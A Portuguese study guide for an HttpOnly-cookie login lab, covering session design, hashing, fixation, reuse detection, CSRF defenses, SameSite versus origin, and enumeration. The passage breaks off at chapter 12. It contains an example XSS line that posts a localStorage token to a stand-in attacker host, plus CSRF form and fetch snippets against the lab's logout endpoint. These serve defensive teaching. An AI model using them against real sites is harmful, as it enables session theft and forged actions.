# Apostila: login com cookie `HttpOnly`

> Material de estudo para o lab [`http-only-login`](README.md).
> Ela cobre o **conceito** e o **protocolo** — a implementação é sua, e isso é de propósito.

---

## 1. HTTP não tem memória

### Passo 1 — Explica pra uma criança

Imagine um restaurante onde todos os garçons têm amnésia total. Você pede um suco; o garçom anota, entrega, e esquece você. Chama outro garçom para pedir o pão — ele nunca viu você na vida. Cada pedido é um estranho novo.

Como almoçar num lugar assim? Você precisa usar **um crachá** — e mostrar o crachá em toda conversa com qualquer garçom. O restaurante não lembra de você; ele só sabe **ler crachás**.

### Passo 2 — Agora com as palavras certas

HTTP é um protocolo **stateless**: cada requisição é processada como se fosse a primeira. Reaproveitar a conexão TCP (keep-alive, HTTP/2) não muda nada disso — a conexão é encanamento, não memória. Se o servidor tem que saber quem você é, a identidade precisa **viajar dentro de cada requisição**.

Três lugares possíveis para ela viajar:

| Onde                | Como                                | Custo                                    |
| ------------------- | ----------------------------------- | ---------------------------------------- |
| Corpo da requisição | mandar e-mail/senha em toda chamada | o cliente tem que guardar e reenviar     |
| Header manual       | `Authorization` em toda chamada     | o **JavaScript** tem que guardar o token |
| Cookie              | o **navegador** anexa sozinho       | o cookie vira propriedade do navegador   |

O cookie ganhou porque tira o trabalho do seu código: uma vez que o servidor manda `Set-Cookie`, é o **browser** que cola o crachá em toda requisição seguinte, para sempre, sem o JavaScript participar. Isso é uma conveniência enorme — e, como você vai ver no capítulo 8, também é a origem de uma classe inteira de ataques.

### Passo 3 — Perguntas de borracha

1. Por que "manter a conexão TCP aberta" **não** resolve o problema de estado?
2. O que exatamente o servidor envia para que o navegador passe a anexar o crachá sozinho?
3. Se o JavaScript nunca escreve uma linha para enviar o cookie, quem escreveu a regra de envio?

### Passo 4 — Lacunas que só fecham fazendo

Abra a tela do lab, faça login (quando implementado), e olhe o painel "O que o JavaScript enxerga". A sessão funciona — e o `sid` não está lá. O crachá viaja; o seu código não o vê.

---

## 2. Anatomia do `Set-Cookie`

### Passo 1 — Explica pra uma criança

O guarda-volumes do cinema. Você entrega o casaco (sua identidade), recebe uma senha (o cookie). O casaco fica **no balcão** — com o cinema. Com você viaja só a senha, e a senha vem com regras impressas: _"só vale neste guichê"_, _"só é aceita se você vier de dia"_, _"proibido copiar à mão"_.

Quem obedece essas regras não é você. É o **funcionário da porta** — o navegador.

### Passo 2 — Agora com as palavras certas

O login deste lab responde, no contrato, com **dois** cookies:

```http
Set-Cookie: sid=…; HttpOnly; Secure; SameSite=Lax; Path=/
Set-Cookie: csrf=…; Secure; SameSite=Lax; Path=/
```

Cada atributo é uma regra que o **navegador** passa a impor, não uma sugestão ao servidor:

| Atributo        | Quem obedece | Efeito                                                                                                    |
| --------------- | ------------ | --------------------------------------------------------------------------------------------------------- |
| `HttpOnly`      | navegador    | `document.cookie` **não inclui** este cookie. Script nenhum o lê.                                         |
| `Secure`        | navegador    | só viaja em HTTPS. (`localhost` é tratado como origem confiável — por isso funciona em dev.)              |
| `SameSite=Lax`  | navegador    | **não** acompanha requisição cross-site que muda estado (POST de outro site). Detalhes no capítulo 9.     |
| `Path=/`        | navegador    | anexa o cookie sob qualquer caminho do domínio. É escopo de conveniência, **não** fronteira de segurança. |
| _sem `Max-Age`_ | —            | cookie de sessão: vive enquanto o browser viver. O prazo **de verdade** está no servidor (capítulo 5).    |

Dois detalhes que parecem cosméticos e não são:

- **Dois cookies, regras opostas.** O `sid` é o segredo — o JavaScript não pode ler (`HttpOnly`). O `csrf` é o contrário: **precisa** ser legível, porque a tela o lê e o espelha num header (capítulo 8). O único cookie do lab sem `HttpOnly` é esse, por desenho.
- **O logout expira cookies com `Max-Age=0` e as MESMAS opções do set.** O navegador casa um cookie pelo conjunto nome + domínio + caminho. Errar uma opção no `Set-Cookie` de expiração não apaga nada — cria um segundo cookie, e o primeiro continua vivo. É o clássico "logout que não desloga".

### Passo 3 — Perguntas de borracha

1. Qual flag o navegador impõe e qual o servidor impõe? (Truque: a tabela inteira é de quem?)
2. Por que o cookie `csrf` deliberadamente **não** tem `HttpOnly`?
3. Por que a ausência de `Max-Age` no cookie de sessão é uma decisão, e não um esquecimento?
4. O logout manda `Max-Age=0`. Isso revoga a sessão? (Pista: capítulo 5.)

### Passo 4 — Lacunas que só fecham fazendo

O `app.ts` sugere uma rota final `/lab/cookies/set` — o laboratório de flags. Faça variações e observe o painel de cookies da tela reagir. A afirmação "HttpOnly impede leitura" vira conhecimento quando você **vê** o campo vazio com a sessão ativa ao lado.

---

## 3. O cookie que o JavaScript não vê

### Passo 1 — Explica pra uma criança

O bilhete do cinema é impresso numa tinta que **não sai na fotografia**. O porteiro aceita o bilhete normalmente — ele foi feito para isso. Mas alguém que fotografar sua mão segurando o bilhete sai com uma foto em branco.

O ladrão aqui é o script malicioso infiltrado na página (XSS). Ele consegue fotografar tudo que está exposto. A tinta especial é o `HttpOnly`.

### Passo 2 — Agora com as palavras certas

O cenário canônico **sem** `HttpOnly`: guardar token de sessão no `localStorage` e mandá-lo num header. Um único XSS na página — biblioteca comprometida, snippet de terceiros, `innerHTML` descuidado — executa:

```js
fetch("https://evil.example", { method: "POST", body: localStorage.getItem("token") });
```

Três linhas e o token do usuário **saiu da máquina** — vale em qualquer lugar, para sempre, até expirar. Esse é o anti-padrão que este lab existe para não repetir.

Com o token num cookie `HttpOnly`, o mesmo script encontra duas muralhas:

1. **Não consegue ler** — `document.cookie` simplesmente não lista o cookie. Não é ofuscado; não está disponível.
2. **Não consegue copiar** o que não leu. A exfiltração — o envio do segredo **para fora**, para uso posterior pelo atacante em qualquer lugar — não acontece.

O que `HttpOnly` **não** promete: impedir que o script malicioso **aja como você dentro do seu navegador**. Um XSS ativo pode disparar `fetch("/auth/logout-all")` que o browser anexa o cookie do mesmo jeito. Contra isso não é a tinta da impressora — é outra defesa (capítulo 8). `HttpOnly` mata o **roubo** da credencial; o abuso em tempo real é problema de outra camada.

Repare na divisão de trabalho que está se formando:

- `HttpOnly` → o segredo não **sai** da negociação navegador-servidor.
- CSRF (cap. 8) → um **outro site** não consegue fazer seu navegador usar o cookie sem permissão.

### Passo 3 — Perguntas de borracha

1. Um XSS com `sid` em `localStorage`: o que o atacante ganha? O mesmo XSS com `sid` em cookie `HttpOnly`: o que muda?
2. Por que `HttpOnly` **não** é uma defesa completa contra XSS?
3. Qual o par (blindagem + lacuna remanescente) que o `HttpOnly` compra?

### Passo 4 — Lacunas que só fecham fazendo

Com a sessão ativa, abra o DevTools e rode `document.cookie`. Depois, aba Application → Cookies, e olhe a coluna do `sid`. A diferença entre as duas vistas **é** o capítulo inteiro.

---

## 4. Dois hashes, duas ameaças

### Passo 1 — Explica pra uma criança

Este lab usa **dois** hashes, e eles são opostos de propósito.

O primeiro protege a **senha**. A senha é um cadeado barato que qualquer um com tempo e uma ferramenta tenta arrombar. Solução: fazer **cada tentativa custar uma moeda**. Arrombar 10 tentativas? 10 moedas. Um bilhão? Um bilhão de moedas. O hash de senha é uma máquina de cobrar por tentativa.

O segundo protege o **token de sessão**. O token não é um cadeado barato — é um cofre cuja combinação tem 78 dígitos sorteados. Ninguém adivinha isso nem cobrando. Aqui o único risco é alguém **anotar a combinação na porta** do cofre. Então o hash de sessão não serve para dificultar tentativas — serve para que o banco **não contenha** a combinação.

### Passo 2 — Agora com as palavras certas

|                     | Hash da senha                                                                            | Hash do token de sessão                          |
| ------------------- | ---------------------------------------------------------------------------------------- | ------------------------------------------------ |
| Algoritmo           | **Argon2id**                                                                             | **SHA-256**                                      |
| Velocidade          | **lento de propósito** (100–250 ms)                                                      | **rápido de propósito**                          |
| Parâmetros          | memória/iterações, **medidos na máquina**, guardados ao lado do hash (`password_params`) | nenhum — é uma função fixa                       |
| Ameaça que enfrenta | **offline**: vazamento do banco → bruta-força em GPU                                     | **online**: token válido apresentado ao servidor |
| Por que hash        | nunca guardar a senha em claro                                                           | nunca guardar o **bearer credential** em claro   |

A coluna "ameaça" é a chave. Repare que são **adversários diferentes**:

- **Senha**: o atacante tem o banco **inteiro** na máquina dele, sem relógio, sem limite de tentativas, sem ninguém olhando. O único custo é tempo de CPU. Um hash de 1 µs transforma "6 tentativas" (a senha da Ana é `ana123`) em "6 µs". Um hash de 200 ms transforma um dicionário de um bilhão de senhas em ~6 anos **por GPU** — e Argon2id ainda cobra **memória**, o que é o que realmente dói em GPU e ASIC.
- **Token**: o atacante **não tem** o banco — ele tem que apresentar um token vivo ao servidor, on-line, e o servidor é quem faz a consulta (rápida: um índice numa PK). Adivinhar um token de 256 bits não é "difícil", é **impraticável por construção estatística**. Lentidão aqui não compra segurança nenhuma e ainda deixa cada request 200 ms mais lenta.

E o `password_params`? Custo de hash é uma **data**: a máquina de hoje é mais rápida que a de ontem. Guardando os parâmetros junto do hash, no login bem-sucedido você compara ("este hash foi gerado com custo X, o padrão atual é Y") e **reescreve** o hash na hora, transparente para o usuário. Sem isso, não há como saber quais hashes estão velhos. É o `needsRehash`.

Por que hashear o token, se ninguém vai bruta-forçá-lo? Porque o valor do banco **é** uma credencial apresentável. Quem rouba o banco não pode sair por aí "apresentando hashes" — a consulta do servidor espera o SHA-256 **do token**, e do hash não há caminho de volta que não custe 2^²⁵⁶.

### Passo 3 — Perguntas de borracha

1. Por que SHA-256 sozinho é irresponsável para senha — e Argon2 para sessão é só desperdício?
2. Qual dos dois adversários tem "tempo ilimitado e ninguém olhando"? O que isso muda na escolha?
3. O que exatamente o vazamento do banco entrega ao atacante, no pior caso, neste design?
4. Sem a coluna `password_params`, o que se torna impossível?

### Passo 4 — Lacunas que só fecham fazendo

O `server/src/auth/measure.ts` é seu para escrever: a meta é **100–250 ms por hash, medidos na SUA máquina**, e os números commitados em `docs/` — a regra do repo é sem número, sem afirmação. Escolher parâmetros de Argon2id sem medir é otimizar no escuro.

---

## 5. A sessão mora no servidor

### Passo 1 — Explica pra uma criança

De volta ao guarda-volumes. A senha que você carrega é só um **número**. O casaco, o nome, o horário em que você chegou, o direito de pegar o casaco de volta — tudo isso está no **caderno do balcão**. Se o cinema quiser barrar você amanhã, basta riscar a linha do caderno: sua senha deixa de valer **na hora**, sem precisar caçar ninguém pelos corredores.

### Passo 2 — Agora com as palavras certas

O desenho completo de uma sessão server-side:

```
login OK
  │
  ▼
token = 256 bits de um gerador criptográfico   ← nunca guardado em lugar nenhum
  │
  ├── cookie:  sid = token            (viaja pro navegador; HttpOnly)
  │
  └── banco:   sessions.id = SHA-256(token)   ← a PK da tabela
               user_id, csrf_secret, created_at, last_seen_at,
               idle_expires_at, absolute_expires_at, family_id, …
```

Três decisões embutidas aí:

1. **256 bits de um CSPRG.** Não é "um UUID a mais": UUIDs comuns (v4) têm metade dos bits previsíveis por estrutura. O tamanho do espaço é a única coisa entre um adivinhador e a sua conta.
2. **O banco guarda só o hash.** Vazou o banco? O atacante tem hashs, não sessões. (Capítulo 4.)
3. **A validade mora no servidor.** Daí os **dois** prazos, que são dois medos diferentes:

```
 created_at                        absolute_expires_at
 │                                    │ teto QUE NÃO DESLIZA
 ├───────┬───────┬───────┬─────────╥──┤
         │       │       │         ║  ← bloqueado aqui, por mais
      touch    touch    touch      ║    ativo que o usuário esteja
         │       │       │         ║
         ◄───────┴───────┴─────────┤
          idle: a janela RECARREGA a cada touch
```

- **Idle (deslizante)**: `last_seen_at + idle_ms`. A aba esquecida no aeroporto morre sozinha 30 min depois do **último** uso. Cada request com sessão válida faz o _touch_ (`last_seen_at = now`).
- **Absolute (teto)**: `created_at + absolute_ms`. Não importa quão ativo: depois de 12 h, nova autenticação. É o limite de vida útil de um **token roubado** — mesmo que o ladrão mantenha a sessão quente com requests, o relógio da fundação não recua.

E a revogação — a razão de ser do modelo. Revogar é **riscar a linha do caderno**: `DELETE`/`revoked_at` na linha. A requisição seguinte consulta, não acha (ou acha revogada), e pronto: 401. Compare com um token autocontido (JWT stateless): o servidor prometeu não consultar nada para validar; revogar exige quebrar a promessa com uma denylist — que é um estado que volta pela porta dos fundos. (O lab irmão `jwt-vs-session` aprofunda exatamente esse contraste.)

Por isso a ausência de `Max-Age` no cookie **não** é omissão: `Max-Age` é um pedido ao navegador, e navegadores não são as partes mais confiáveis da história (restauração de sessão, cópias, ferramentas). O prazo que **revoga** é o do servidor. `Max-Age` expira um cookie; a linha no banco expira uma **sessão**.

### Passo 3 — Perguntas de borracha

1. O que exatamente está no cookie, o que está no banco, e por que essa divisão?
2. Sessão vencida por **idle** vs por **absolute**: qual delas pode "renascer" com uma request certa — e por quê?
3. Por que revogação instantânea é a vantagem estrutural da sessão server-side sobre o JWT stateless?
4. O `logout-all` derruba a outra janela **na requisição seguinte**. Que mecanismo torna isso verdade, no lugar de "mais cedo ou mais tarde"?

### Passo 4 — Lacunas que só fecham fazendo

As duas expirações só ficam reais com relógio: teste com `SESSION_IDLE_MS=5000` e sinta a sessão morrer. O README pede explicitamente "vencida pelo absoluto não volta **mesmo com touch recente**" — construir o teste que prova isso é entender os dois prazos.

---

## 6. Fixation: por que o id muda no login

### Passo 1 — Explica pra uma criança

O golpe do ingresso fixado. O golpista compra um ingresso **ainda sem dono**, com número `123`, e o enfia no seu bolso (num link, num cookie plantado). Você chega ao cinema, apresenta o `123`, paga, entra — a bilheteria carimba o `123` **no seu nome**. Pronto: o golpista tem uma **cópia** do `123`, que agora vale como você.

A correção é quase infantil: no momento em que você se identifica, o cinema **rasga o ingresso apresentado e emite outro, número novo**. O número que andou por aí antes do login nunca ganha valor.

### Passo 2 — Agora com as palavras certas

**Session fixation**: o atacante faz com que a **vítima autentique numa sessão que ele já conhece**. O mecanismo clássico (id na URL, `?sid=…`) é raro hoje, e navegadores modernos dificultam cookie plantado cross-site — mas a defesa continua canônica por três motivos:

1. É **barata**: gerar um id novo no login não custa nada.
2. É **estrutural**: ela elimina a classe inteira do ataque, em vez de apostar que cada via de plantio foi fechada.
3. A regra geral importa mais que o caso: **qualquer mudança de privilégio rotaciona o identificador.** Login é upgrade de anônimo → autenticado. Mudança de papel é upgrade de usuário → admin. O id pré-upgrade era visível a um mundo mais pobre de confiança; o pós-upgrade não pode ter circulado lá.

Neste lab, a rotação já nasce conectada ao capítulo seguinte: o novo id entra no banco com `family_id` compartilhado e `previous_id` apontando para o antigo, que ganha `rotated_at`. **Reapresentar** o antigo, depois disso, não é erro — é **evidência** (capítulo 7).

O "Done" do README é objetivo: _"O id do cookie **muda** no login"_. Não no olho — num teste que pega o `Set-Cookie` antes e depois e vê valores diferentes.

### Passo 3 — Perguntas de borracha

1. No ataque de fixation, o que exatamente o atacante **sabe** e quando ele passa a sabê-lo?
2. Por que "rotacionar em qualquer mudança de privilégio" é a regra, e não só "no login"?
3. Por que a fixação é um problema **antes** do login, e a rotação resolve **no instante** do login?

### Passo 4 — Lacunas que só fecham fazendo

Escreva o teste antes da rotação existir: logue, capture o cookie, logue de novo, compare. Vai falhar — a sessão anônima (ou um id prévio qualquer) persiste através do login. Aí implemente a rotação e veja o teste virar. Falha vista primeiro é o aprendizado; a correção é quase sempre trivial.

---

## 7. Famílias: o token roubado que se denuncia

### Passo 1 — Explica pra uma criança

Série de ingressos reemitidos. Um mesmo assento pode ser reemitido: o portador chega, o ingresso antigo é rasgado, sai um novo da série (mesma família, número seguinte). Certo dia, alguém apresenta um ingresso **rasgado** — já reemitido.

Isso só tem duas explicações: ou o dono legítimo guardou uma foto antiga por descuido, ou **alguém copiou o ingresso antes da reemissão**. O cinema não consegue provar qual das duas. Então decide: **cancela a série inteira**. O dono legítimo reclama, prova identidade, ganha ingresso novo. O copiador fica com papel picado.

### Passo 2 — Agora com as palavras certas

O mecanismo no banco:

- `family_id` — agrupa todas as rotações de um mesmo login;
- `previous_id` — cada nova sessão aponta para a que ela substituiu;
- `rotated_at` — não-nulo significa "esta sessão já foi substituída; **não deve mais aparecer em lugar nenhum**".

A regra de detecção cabe numa linha: **apresentaram um id com `rotated_at` preenchido → reuso detectado → revogue a família inteira → grave `reuse_detected` em `auth_events`**.

Por que a família **inteira**, e não só a sessão reapresentada? Porque você não sabe **quando** a cópia foi feita — se foi, todas as rotações descendentes podem estar comprometidas. O custo do erro é assimétrico, e a escolha decorre dele:

- **Falso positivo** (era uma aba antiga com cookie atrasado): usuário perde as sessões, loga de novo. Incômodo.
- **Falso negativo** (era um ladrão, e você só cortou a sessão antiga): o ladrão continua dentro com as sessões novas. Desastre.

Nesse comércio, incômodo se compra, desastre não. É a mesma álgebra por trás de revogar um cartão inteiro quando há suspeita de clonagem de uma transação.

Duas sutilezas que valem ouro:

1. O **evento** é a entrega, não o side effect. Um `reuse_detected` sem trilha (`auth_events`) é um alarme que toca no vazio. A tabela de auditoria (`login_ok`, `login_fail`, `rotate`, `reuse_detected`, `logout`, …) é o que transforma incidente em investigação.
2. Reuso é o sinal de roubo **barato de detectar**: você não precisa entender como o token vazou. A inconsistência apresentação × registro **é** a prova.

### Passo 3 — Perguntas de borracha

1. O que diferencia uma sessão "velha e inofensiva" de uma sessão "reapresentada"? (Dica: quem decide isso é um campo — qual?)
2. Por que revogar só a sessão reapresentada é insuficiente?
3. Quais são os dois lados do trade-off, e qual lado o design escolhe perder?
4. De que serve o `reuse_detected` sem a linha em `auth_events`?

### Passo 4 — Lacunas que só fecham fazendo

O teste do README: "Reapresentar um id rotacionado mata a família e registra o evento". Montá-lo exige **dois clientes com jars separados** e um cookie salvo antes da rotação — coreografia de teste que só se aprende montando. O `@labs/test-kit` já dá o `apiClient(app)` para cada device.

---

## 8. CSRF: o ataque que viaja no seu cookie

### Passo 1 — Explica pra uma criança

O golpista não consegue **ler** seu bilhete (capítulo 3 resolveu isso). Nova ideia: construir uma **máquina que faz a SUA mão entregar o bilhete ao guichê**. Você entra no site do golpista; a página dele contém um botão "ver oferta" que, na verdade, é um **formulário endereçado ao banco** — e o formulário é despachado **pelo seu navegador**, que, como sempre, anexa seus cookies ao banco.

O navegador tem uma regra simples e cega: _"requisição para o banco? anexo os cookies do banco"_. Ele não pergunta **quem pediu** para fazer a requisição.

### Passo 2 — Agora com as palavras certas

O `attacker.html` do lab implementa as duas variantes:

```html
<!-- Variante 1: formulário. Não precisa de CORS — navegação/form não passam
     por preflight, e a resposta some num iframe. O browser ENVIA e ESCONDE. -->
<form action="http://localhost:4000/auth/logout-all" method="POST" target="sink">
  <button>Deslogar a vítima de todos os dispositivos</button>
</form>
```

```js
// Variante 2: fetch com credenciais. Essa JÁ é governada por CORS —
// e o navegador bloqueia antes de a resposta chegar ao script.
await fetch("http://localhost:4000/auth/logout-all", {
  credentials: "include",
  method: "POST",
});
```

A lição embarcada na variante 1, em negrito: **CORS não é defesa contra CSRF.** CORS controla a **leitura** de respostas cross-origin pelo script; o formulário não precisa ler nada — o dano é o POST ter acontecido. (É por isso que o alvo do ataque é `logout-all` e não "extrair dados": CSRF muda **estado**, não lê.)

As três defesas, em camadas — o lab tem as duas últimas chaveáveis por env:

1. **`SameSite=Lax`** (navegador): o browser deixa de anexar o cookie em POST cross-site. Excelente padrão — mas é política do **navegador**, com histórico de buracos e versões ausentes. Sozinha, é uma porta que você não fabricou.
2. **Checagem de `Origin`** (servidor): _"quem iniciou esta requisição?"_ Todo navegador moderno envia `Origin` em POSTs. Se não está na allowlist → 403, **mesmo com token válido** (o teste do README pede exatamente esse caso).
3. **Token CSRF** (aplicação): a prova de que **a própria página** leu um valor. A tela busca `GET /auth/csrf`, recebe o valor no corpo **e** num cookie legível (`csrf`, o único sem `HttpOnly`), e espelha em `X-CSRF-Token` em todo POST/DELETE.

Por que o espelhamento funciona como prova? O atacante cross-site está em **outro origin**: não lê o cookie `csrf` (mesma muralha do capítulo 3), e não consegue enviar um **header customizado** sem passar por preflight de CORS — que o servidor só aprova para origens da allowlist. O formulário dele não tem como escrever headers. Token de **outra** sessão também não vale: o par cookie+header precisa casar **com a sessão que faz a requisição** — reenviar um token capturado noutro contexto falha (e há teste para isso).

E o modo `hmac` (o padrão do lab)? No double-submit puro, o servidor só compara _cookie == header_ — o que é bom, mas ainda trusting do valor, que teoricamente pode ser **injetado** por subdomínios irmãos. No modo HMAC, o valor é **derivado do `csrf_secret` da própria sessão**: o atacante não consegue nem forjar o token, porque o segredo que o gerou nunca saiu do servidor. É double-submit com assinatura de nascença.

O desenho final, então, é uma coroa de três camadas — e nenhuma delas é "confiar no navegador":

```
site atacante                        seu servidor
     │                                     │
     │  POST /auth/logout-all              │
     │────────────────────────────────────►│  1. SameSite: cookie veio? (browser)
     │                                     │  2. Origin está na allowlist?
     │                                     │  3. X-CSRF-Token casa com a sessão?
     │                                     │     (HMAC do csrf_secret dela)
     │◄──────────── 403 ───────────────────│  qualquer "não" pára aqui
```

### Passo 3 — Perguntas de borracha

1. Por que o alvo do `attacker.html` é `logout-all` e não "ver o saldo da vítima"?
2. Por que o formulário atravessa o CORS sem ser bloqueado — e o `fetch` não?
3. O que o atacante precisaria conseguir para vencer o double-submit? E o que o modo HMAC tira da mesa além disso?
4. Por que o cookie `csrf` é o único sem `HttpOnly`, sem que isso seja um furo?
5. Token de CSRF de **outra sessão**: por que deve falhar, e o que isso protege?

### Passo 4 — Lacunas que só fecham fazendo

Rode o ataque com as defesas ligadas (falha), depois com `CSRF_MODE=off CHECK_ORIGIN=false` (funciona). Se o ataque **não** passa a funcionar, alguma coisa estava segurando a porta sem você saber qual — e descobrir o quê é o exercício real. A regra do repo é literal: _ver a falha acontecer é o aprendizado_.

---

## 9. O trap: site não é origin

### Passo 1 — Explica pra uma criança

Duas coisas que parecem a mesma e não são:

- **Origem**: o endereço **exato** — prédio, andar, apartamento. `localhost:4001` e `localhost:4000` são apartamentos diferentes.
- **Site**: o **prédio** inteiro. Ignora o andar (a porta). As duas janelas do mesmo prédio são o mesmo site.

Para o `SameSite` do navegador, o que importa é o **prédio**. Então montar um ataque do apartamento 4001 contra o 4000 é atacar "de dentro do prédio": o cookie atravessa, o `SameSite` nem é consultado — e o teste que você escreveu "de CSRF" passou **sem ter testado defesa nenhuma**.

O atacante do lab mora noutro prédio: `127.0.0.1`. Parece a mesma rua (`localhost` é só o nome bonito do `127.0.0.1`, né?), mas para a regra do "domínio registrável", `localhost` e `127.0.0.1` **não têm prédio em comum**. É outro site de verdade.

### Passo 2 — Agora com as palavras certas

- **Origin** = esquema + host + porta. `http://localhost:4001` ≠ `http://localhost:4000` — portas diferentes são origins diferentes. É a unidade do **CORS**.
- **Site** = domínio registrável (o "eTLD+1"), **porta ignorada**. `localhost:4001` e `localhost:4000` são o **mesmo site**. É a unidade do **`SameSite`**.

As três portas do lab, classificadas:

```
localhost:4001  ──(a tela)──────────►  localhost:4000
   mesmo SITE, origin DIFERENTE ── SameSite não restringe;
                                    CORS é quem governa (com credentials)

127.0.0.1:4002  ──(o atacante)─────►  localhost:4000
   SITE diferente (não há domínio registrável em comum)
   ── aqui sim o SameSite entra em cena: POST cross-site sem cookie
```

E mais uma camada, que é a life-cycle do dev: **o Vite proxy**. Por padrão, o `dev` do lab faz a tela falar com `/api` **no próprio 4001**, e o Vite repassa ao 4000 **server-side**. Para o navegador, tudo é same-origin — o cookie se comporta "como em produção", sem brigar com `SameSite=None; Secure` sobre `http://localhost`. Quando você roda `VITE_DIRECT_API=1`, o proxy sai do caminho: a tela bate direto no 4000, **cross-origin de verdade**, e o CORS (com `credentials: true` e origem explícita) deixa de ser detalhe e passa a ser requisito — visível no console quando quebra.

A lição ampliada: **saiba qual unidade cada mecanismo mede.** CORS mede origin. Cookies `SameSite` medem site. O teste montado na fronteira errada valida a coisa errada — e passa.

### Passo 3 — Perguntas de borracha

1. `localhost:4000` e `localhost:4001`: mesma origin? Mesmo site? Quem liga para cada resposta?
2. Por que o atacante **precisa** morar em `127.0.0.1:4002` para este lab exercitar `SameSite`?
3. O que muda para o navegador quando `VITE_DIRECT_API=1` — e qual mecanismo passa a ser testado de verdade?
4. Um teste de CSRF "entre as duas portas de localhost" que passa: o que ele realmente provou?

### Passo 4 — Lacunas que só fecham fazendo

Leia o erro de CORS no console com `VITE_DIRECT_API=1` — o `attacker.html` até avisa: _o erro aparece lá, nunca no objeto de erro do fetch_. Depois escreva `docs/cookies.md` com a tabela que você mesmo observou: configuração × legível por JS × enviado cross-site × consequência.

---

## 10. Enumeração: o que o erro revela

### Passo 1 — Explica pra uma criança

Um segurança de boate que responde "nunca vi você" **rápido** para quem não tem cadastro, e "senha errada" **devagar** (porque consulta a lista) para quem tem. Qualquer um com cronômetro monta o roster dos clientes sem nunca entrar.

Um sistema de login que diz "e-mail não existe" num tempo e "senha errada" noutro — ou com mensagens diferentes — está entregando, de graça, **a lista de quem tem conta**.

### Passo 2 — Agora com as palavras certas

O contrato do lab para `POST /auth/login`:

```jsonc
// ← 401
{ "code": "invalid_credentials", "message": "E-mail ou senha inválidos" }
//   idêntico para e-mail inexistente e senha errada, inclusive no tempo
```

Três frentes, e as três precisam andar juntas:

1. **Corpo idêntico.** Mesma mensagem, mesmo `code`, mesmo status. "Usuário não encontrado" e "senha incorreta" são informações distintas — para o **atacante**.
2. **Tempo constante.** Usuário inexistente não pode ser o caminho rápido (sem hash para verificar). A resposta clássica: **pague o hash de qualquer jeito** — verifique contra um hash descartável quando o usuário não existe. O cronômetro volta a não medir nada.
3. **Lockout.** Depois de N tentativas: `failed_attempts`, `locked_until`, resposta `429`. O custo de tempo constante estanca a enumeração de **senhas**; o lockout estanca a tentativa e erro em volume.

E a assimetria honesta do `POST /auth/register` (`409 e-mail já existe`): no cadastro, **não dá** para esconder que o e-mail existe — a UX exige o 409. O que se faz lá é não entregar **mais** do que o 409 já entrega: mensagem genérica, sem detalhes da conta. Enumeração se move para o login, e é no login que ela morre.

Note o padrão do lab inteiro se repetindo: a resposta do sistema é uma **superfície de ataque**. O corpo, o status, o tempo — tudo é canal.

### Passo 3 — Perguntas de borracha

1. Por que mensagem idêntica **sem** tempo idêntico ainda enumera contas?
2. Qual é exatamente a diferença de trabalho do servidor entre "e-mail não existe" e "senha errada" — e como ela fica invisível do lado de fora?
3. Por que o register aceita revelar existência (409) e o login recusa revelar a mesma coisa?

### Passo 4 — Lacunas que só fecham fazendo

O teste do README é explícito: _"login inválido e usuário inexistente com corpo **e** status idênticos"_. Acrescente você a terceira cláusula que o README deixa subentendida: **e tempos comparáveis**. Meça.

---

## 11. Roteiro de implementação

A ordem abaixo é a do próprio `app.ts` — cada degrau usa o anterior. Para cada passo: o que, o critério de pronto (do [README](README.md)), e a pergunta que você deve responder antes de seguir.

### Passo 1 — `POST /auth/register`

Argon2id com parâmetros medidos, `password_params` ao lado do hash, e-mail único **case-insensitive** (`Ana@` = `ana@`), 422 para senha fraca, 409 genérico para duplicata.
_Critério:_ cadastrar `ana@exemplo.com` e depois `ANA@exemplo.com` → conflito.
_Pergunta de borracha:_ por que unicidade de e-mail tem que ignorar caixa — e onde isso mora, no índice ou na disciplina do código?

### Passo 2 — `POST /auth/login`

Verificação Argon2, custo pago também para usuário inexistente, lockout, e **a rotação nascendo aqui**: token novo, família nova, `Set-Cookie` duplo com as flags exatas do contrato.
_Critério:_ os dois cookies no header; o id **muda** entre estados pré e pós-login.
_Pergunta:_ o que o cronômetro de um atacante mede no seu login — e como você o cegou?

### Passo 3 — `GET /auth/me`

Aqui nasce o middleware de resolução de sessão: cookie → hash → linha no banco → cheques (revogada? idle? absolute?) → touch. 401 para tudo que não é "linha válida".
_Critério:_ `me` funciona no jar que logou, e 401 num jar limpo.
_Pergunta:_ em que ordem você checa as três condições de morte — e importa a ordem (para o tempo de resposta)?

### Passo 4 — `POST /auth/logout` e `POST /auth/logout-all`

Revogação da sessão atual / da família inteira, cookies expirados com `Max-Age=0` **e as mesmas opções do set**.
_Critério:_ dois jars logados; `logout-all` num deles; o outro recebe 401 **na requisição seguinte**.
_Pergunta:_ por que "na requisição seguinte", e não "eventualmente" — qual propriedade do desenho garante o imediatismo?

### Passo 5 — `GET /auth/sessions` e `DELETE /auth/sessions/:id`

A lista de dispositivos (`current: true` na sessão dona da request) e a revogação individual.
_Critério:_ revogar sessão **de outro usuário** → 404, nunca 403.
_Pergunta:_ por que 403 ali seria um IDOR em miniatura — o que cada status confirma para o atacante?

### Passo 6 — `GET /auth/csrf` + o middleware que o exige

O par cookie-legível + token no corpo; nas POST/DELETE: `X-CSRF-Token` validado conforme `CSRF_MODE`, checagem de `Origin` conforme `CHECK_ORIGIN`.
_Critério:_ sem token → 403; token de outra sessão → 403; Origin fora da allowlist → 403 **mesmo com token válido**; e com `CSRF_MODE=off`, o exploit do `attacker.html` **passa**.
_Pergunta:_ quais das suas três camadas o formulário do atacante nem tenta atravessar — e quais o `fetch` tenta?

### Passo 7 — `GET /lab/cookies/set`

O laboratório de flags (F1.7): setar combinações de atributos e ver o painel da tela reagir.
_Critério:_ o painel "O que o JavaScript enxerga" conta a história do capítulo 3 diante dos seus olhos.

### Variáveis de ambiente

Conforme for precisando, acrescente ao `env.ts` (cada chave ganha validação de graça): `CSRF_MODE`, `CHECK_ORIGIN`, `SESSION_SAMESITE`, `SESSION_IDLE_MS`, `SESSION_ABSOLUTE_MS`, `SESSION_STORE` — a tabela completa com padrões está no [README](README.md#variáveis-de-ambiente). As três primeiras existem para que **um teste possa provar que o exploit funciona** com as defesas desligadas.

### Modelo de dados

As três tabelas (`users`, `sessions`, `auth_events`) estão especificadas no [README](README.md#modelo-de-dados) campo a campo — cada campo ali é um capítulo desta apostila condensado numa coluna. Depois do schema: `db:generate`, `pnpm dev http-only-login`.

---

## 12. Como provar que funciona

### Passo 1 — Explica pra uma criança

